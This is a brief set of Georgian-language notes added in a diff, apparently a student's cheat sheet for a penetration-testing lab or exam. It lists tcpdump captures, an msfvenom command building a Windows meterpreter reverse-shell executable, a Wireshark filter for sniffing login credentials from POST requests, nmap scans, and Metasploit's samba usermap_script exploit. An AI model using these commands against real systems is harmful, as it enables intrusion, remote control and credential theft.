@@ -1,0 +1,25 @@
+ერთი სამქულიანი:
+sudo tcpdump eth0 192.168.30.200 -nn -w file - ფაილის სახელი
+
+sudo tcpdump eth0 192.168.30.200 and port 8080 -w file
+
+მეორე სამქულიანი:
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.0.2.8 lport=6666 -f exe --platform=windows -o windowspayload.exe
+
+პაროლის და იუზერის ამოღება ვაირშარკიდან:
+http requst.method =="POST"
+
+
+
+10 ქულიანი დავალბეა ბოლო სერვერის გატეხვა
+ifconfig
+nmap 10.0.2.0/24 - ჩვენი აიპი
+nmap 10.0.2.4 -sV -p 149
+sudo msfconsole
+
+
+
+search samba 
+use 8  or exploit/multi/samba/usermap_script
+
+
